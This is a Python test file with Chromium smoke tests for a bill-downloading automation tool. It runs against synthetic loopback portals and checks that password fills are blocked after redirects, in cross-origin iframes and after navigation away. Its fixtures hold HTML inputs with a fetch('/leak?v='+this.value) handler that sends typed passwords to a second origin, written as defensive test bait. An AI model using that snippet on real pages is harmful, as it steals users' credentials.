"""Opt-in real Chromium smoke against a loopback-only synthetic portal."""

import copy
import os
import sqlite3
import sys
import tempfile
import threading
import unittest
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path
from types import SimpleNamespace
from unittest.mock import patch

sys.path.insert(0, str(Path(__file__).resolve().parents[1] / "apps"))
import BillCollectorServices_pw as runner
from playwright.sync_api import sync_playwright


PDF = b"%PDF-1.4\n1 0 obj\n<<>>\nendobj\n%%EOF\n"


@unittest.skipUnless(os.environ.get("BILLCOLLECTOR_BROWSER_TESTS") == "1",
                     "set BILLCOLLECTOR_BROWSER_TESTS=1 for real Chromium smoke")
class BrowserSmokeTests(unittest.TestCase):
    def test_persistent_session_download_and_dedup(self):
        seen_cookies = []

        class Portal(BaseHTTPRequestHandler):
            def do_GET(self):
                if self.path == "/":
                    seen_cookies.append(self.headers.get("Cookie", ""))
                    body = (b"<input aria-label='Username'><input aria-label='Password'>"
                            b"<button onclick=\"document.cookie='session=lab; Max-Age=3600; path=/'; "
                            b"document.querySelectorAll('a').forEach(a => a.hidden=false)\">Login</button>"
                            b"<a hidden href='/invoice'>Invoice</a>"
                            b"<a hidden href='/bad'>Bad invoice</a>")
                    self.send_response(200)
                    self.send_header("Content-Type", "text/html")
                elif self.path == "/invoice":
                    body = PDF
                    self.send_response(200)
                    self.send_header("Content-Type", "application/pdf")
                    self.send_header("Content-Disposition", "attachment; filename=private-invoice.pdf")
                elif self.path == "/bad":
                    body = b"<html>not a PDF</html>"
                    self.send_response(200)
                    self.send_header("Content-Type", "text/html")
                    self.send_header("Content-Disposition", "attachment; filename=not-an-invoice.pdf")
                elif self.path == "/redirect":
                    self.send_response(302)
                    self.send_header("Location", "/evil")
                    self.end_headers()
                    return
                elif self.path == "/evil":
                    body = b"<input aria-label='Password'>"
                    self.send_response(200)
                    self.send_header("Content-Type", "text/html")
                else:
                    self.send_error(404)
                    return
                self.send_header("Content-Length", str(len(body)))
                self.end_headers()
                self.wfile.write(body)

            def log_message(self, *_args):
                pass

        server = ThreadingHTTPServer(("127.0.0.1", 0), Portal)
        worker = threading.Thread(target=server.serve_forever, daemon=True)
        worker.start()
        self.addCleanup(server.server_close)
        self.addCleanup(server.shutdown)

        url = f"http://127.0.0.1:{server.server_port}/"
        recipe = {"services": [{"serviceName": "lab", "steps": [
            {"step": 1, "methods": [{"method": "goto", "arguments": [{"url": url}]}]},
            {"step": 2, "methods": [
                {"method": "get_by_role", "arguments": [{"role": "textbox"}, {"name": "Username"}]},
                {"method": "fill", "arguments": [{"value": "{{USERNAME}}"}]},
            ]},
            {"step": 3, "methods": [
                {"method": "get_by_role", "arguments": [{"role": "textbox"}, {"name": "Password"}]},
                {"method": "fill", "arguments": [{"value": "{{PASSWORD}}"}]},
            ]},
            {"step": 4, "methods": [
                {"method": "get_by_role", "arguments": [{"role": "button"}, {"name": "Login"}]},
                {"method": "click"},
            ]},
            {"step": 5, "methods": [{"method": "expect_download"}], "steps": [
                {"step": 6, "methods": [
                    {"method": "get_by_role", "arguments": [{"role": "link"}, {"name": "Invoice"}, {"exact": True}]},
                    {"method": "click"},
                ]},
            ]},
        ]}]}

        with tempfile.TemporaryDirectory() as directory:
            root = Path(directory)
            profile_root = root / "profiles"
            profile_root.mkdir(mode=0o700)
            cache = str(Path.home() / ".cache" / "ms-playwright")
            with patch.dict(os.environ, {
                "BILLCOLLECTOR_PUBLICATION_ROOT": str(root / "publication"),
                "PLAYWRIGHT_BROWSERS_PATH": cache,
            }), patch.object(runner, "CHROMIUM_PLAYWRIGHT_PROFILE", str(profile_root)), \
                 patch.object(runner, "DB_FILE", str(root / "runs.sqlite3")):
                results = []
                for _ in range(2):
                    account = runner.ServiceObj("lab", "alice", "synthetic-password", None,
                                                False, str(root / "unused"), account_id="lab alice")
                    account.yml = recipe
                    account.external_recipe = False
                    results.append(runner.perform_actions(account))
                bad_recipe = copy.deepcopy(recipe)
                bad_recipe["services"][0]["steps"][-1]["steps"][0]["methods"][0]["arguments"][1]["name"] = "Bad invoice"
                bad_account = runner.ServiceObj("lab", "alice", "synthetic-password", None,
                                                False, str(root / "unused"), account_id="lab alice")
                bad_account.yml = bad_recipe
                bad_account.external_recipe = False
                with self.assertRaisesRegex(RuntimeError, "Download step failed"):
                    runner.perform_actions(bad_account)

                with sync_playwright() as playwright, runner.locked_profile(profile_root, "redirect") as profile:
                    context = runner.InitBrowser(playwright, SimpleNamespace(dbg=False), profile)
                    try:
                        page = context.new_page()
                        page.goto(f"http://127.0.0.1:{server.server_port}/redirect")
                        self.assertTrue(page.url.endswith("/evil"))
                        external = SimpleNamespace(service="lab", page=page, usr="alice",
                            pwd="synthetic-password", otp=None, external_recipe=True,
                            allowed_recipe_origins=frozenset({"https://approved.example.test"}))
                        fill = {"step": 1, "methods": [
                            {"method": "get_by_role", "arguments": [{"role": "textbox"}, {"name": "Password"}]},
                            {"method": "fill", "arguments": [{"value": "{{PASSWORD}}"}]},
                        ]}
                        with self.assertRaisesRegex(runner.RecipeContractError, "credential fill blocked"):
                            runner.process_step(external, fill)
                    finally:
                        context.close()
            self.assertEqual(results, [[{"result": "published"}], [{"result": "duplicate"}]])
            published = list((root / "publication" / "output").glob("*.pdf"))
            self.assertEqual(len(published), 1)
            self.assertEqual(published[0].read_bytes(), PDF)
            self.assertEqual(len(seen_cookies), 3)
            self.assertIn("session=lab", seen_cookies[1])
            connection = sqlite3.connect(root / "runs.sqlite3")
            try:
                self.assertEqual(connection.execute(
                    "SELECT result FROM Service ORDER BY id DESC LIMIT 1").fetchone()[0], "failure")
            finally:
                connection.close()

    def test_credential_fill_into_cross_origin_frame_is_blocked(self):
        leaks = []

        class Site(BaseHTTPRequestHandler):
            def do_GET(self):
                if self.path == "/":
                    body = (f"<input id='p'><iframe src='http://localhost:"
                            f"{frame_server.server_port}/frame'></iframe>").encode()
                elif self.path == "/frame":
                    body = b"<input id='p' oninput=\"fetch('/leak?v='+this.value)\">"
                else:
                    leaks.append(self.path)
                    body = b""
                self.send_response(200)
                self.send_header("Content-Type", "text/html")
                self.end_headers()
                self.wfile.write(body)

            def log_message(self, *_args):
                pass

        servers = [ThreadingHTTPServer(("127.0.0.1", 0), Site) for _ in range(2)]
        top_server, frame_server = servers
        for server in servers:
            threading.Thread(target=server.serve_forever, daemon=True).start()
            self.addCleanup(server.server_close)
            self.addCleanup(server.shutdown)
        frame_step = {"step": 1, "methods": [
            {"method": "locator", "arguments": [{"selector": "iframe >> internal:control=enter-frame >> #p"}]},
            {"method": "fill", "arguments": [{"value": "{{PASSWORD}}"}]},
        ]}
        top_step = copy.deepcopy(frame_step)
        top_step["methods"][0]["arguments"] = [{"selector": "#p"}]
        cache = str(Path.home() / ".cache" / "ms-playwright")
        with patch.dict(os.environ, {"PLAYWRIGHT_BROWSERS_PATH": cache}), sync_playwright() as playwright:
            browser = playwright.chromium.launch()
            try:
                page = browser.new_page()
                page.goto(f"http://127.0.0.1:{top_server.server_port}/")
                page.frame_locator("iframe").locator("#p").wait_for()
                bcs = SimpleNamespace(service="sample", page=page, usr="user", pwd="SENTINEL", otp=None,
                                      external_recipe=True,
                                      allowed_recipe_origins=frozenset({"https://approved.test"}))
                # The loopback page is HTTP; treat it as the approved origin so only
                # the frame check stands between the secret and the child frame.
                with patch.object(runner, "https_origin", return_value="https://approved.test"):
                    with self.assertRaisesRegex(runner.RecipeContractError, "top-level page"):
                        runner.process_step(bcs, frame_step)
                    self.assertFalse(runner.process_step(bcs, top_step).error_status)
                page.wait_for_timeout(300)
                self.assertEqual(page.locator("#p").input_value(), "SENTINEL")
                self.assertEqual(page.frame_locator("iframe").locator("#p").input_value(), "")
                self.assertEqual(leaks, [])
            finally:
                browser.close()

    def test_credential_fill_after_navigation_during_wait_is_blocked(self):
        leaks = []

        class Site(BaseHTTPRequestHandler):
            def do_GET(self):
                if self.path == "/":
                    # Approved page: no field yet, then it leaves for another origin.
                    body = (f"<script>setTimeout(() => location.href = 'http://localhost:"
                            f"{other_server.server_port}/form', 200)</script>").encode()
                elif self.path == "/form":
                    body = b"<input id='p' oninput=\"fetch('/leak?v='+this.value)\">"
                else:
                    leaks.append(self.path)
                    body = b""
                self.send_response(200)
                self.send_header("Content-Type", "text/html")
                self.end_headers()
                self.wfile.write(body)

            def log_message(self, *_args):
                pass

        servers = [ThreadingHTTPServer(("127.0.0.1", 0), Site) for _ in range(2)]
        approved_server, other_server = servers
        for server in servers:
            threading.Thread(target=server.serve_forever, daemon=True).start()
            self.addCleanup(server.server_close)
            self.addCleanup(server.shutdown)
        approved_prefix = f"http://127.0.0.1:{approved_server.server_port}/"
        step = {"step": 1, "methods": [
            {"method": "locator", "arguments": [{"selector": "#p"}]},
            {"method": "fill", "arguments": [{"value": "{{PASSWORD}}"}]},
        ]}
        cache = str(Path.home() / ".cache" / "ms-playwright")
        with patch.dict(os.environ, {"PLAYWRIGHT_BROWSERS_PATH": cache}), sync_playwright() as playwright:
            browser = playwright.chromium.launch()
            try:
                page = browser.new_page()
                page.goto(approved_prefix)
                bcs = SimpleNamespace(service="sample", page=page, usr="user", pwd="SENTINEL", otp=None,
                                      external_recipe=True,
                                      allowed_recipe_origins=frozenset({"https://approved.test"}))
                # Map the loopback HTTP origins: only the first server is approved.
                def origin(url):
                    approved = str(url).startswith(approved_prefix)
                    return "https://approved.test" if approved else "https://other.test"

                with patch.object(runner, "https_origin", side_effect=origin):
                    with self.assertRaisesRegex(runner.RecipeContractError, "element origin"):
                        runner.process_step(bcs, step)
                page.wait_for_timeout(300)
                self.assertTrue(page.url.endswith("/form"))
                self.assertEqual(page.locator("#p").input_value(), "")
                self.assertEqual(leaks, [])
            finally:
                browser.close()
